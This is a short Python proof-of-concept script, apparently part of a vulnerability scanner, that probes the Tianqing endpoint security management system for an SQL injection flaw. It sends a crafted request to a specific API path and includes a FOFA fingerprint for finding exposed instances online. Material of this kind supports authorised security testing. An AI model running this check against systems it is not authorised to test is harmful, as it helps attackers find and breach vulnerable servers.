#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()

# 脚本信息
######################################################
NAME='TianQing_SQLinjection'
AUTHOR="JDQ"
REMARK='天擎终端安全管理系统SQL注入'
FOFA_RULE='icon_hash="-829652342"'
######################################################

def poc(target):
    result = {}
    headers={
        "User-Agent": ua
    }

    try:
        r = requests.get(target+"/api/dp/rptsvcsyncpoint?ccid=1",headers=headers, verify=False,timeout=10,proxies=proxies)
        if r.status_code==200 and 'result":0,"reason":"success' in r.text:
            result['vurl'] = target + "/api/dp/rptsvcsyncpoint?ccid=1"
            result['poc'] = NAME
            return result
    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1")